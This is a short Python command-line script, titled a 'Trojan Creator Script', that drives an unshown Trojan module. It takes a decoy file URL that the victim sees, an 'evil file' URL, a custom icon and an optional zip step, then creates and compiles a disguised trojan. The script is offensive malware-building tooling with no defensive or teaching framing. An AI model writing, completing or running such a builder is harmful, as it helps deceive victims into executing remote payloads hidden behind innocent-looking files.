#!/usr/bin/env python3

import argparse
from Trojan import *

parser = argparse.ArgumentParser(description="Trojan Creator Script")

parser.add_argument('-f', '--front-file', dest='front_file_url', required=True,
                    help='Direct URL to file that the user will see.')
parser.add_argument('-e', '--evil-file', dest='evil_file_url', required=True,
                    help='Direct URL to the evil file file.')
parser.add_argument('-o', '--out-file', dest='out_file_path', required=True,
                    help='Location to store the result.')
parser.add_argument('-i', '--icon', dest='icon_path', 
                    help='Trojan icon.')
parser.add_argument('-z', '--zip', dest='zip', action="store_true", 
                    help='Zip trojan?')

args = parser.parse_args()

trojan = Trojan(args.front_file_url, args.evil_file_url, args.icon_path, args.out_file_path, 0)
trojan.create()
trojan.compile()

if args.zip: 
    trojan.zip(args.out_file_path)
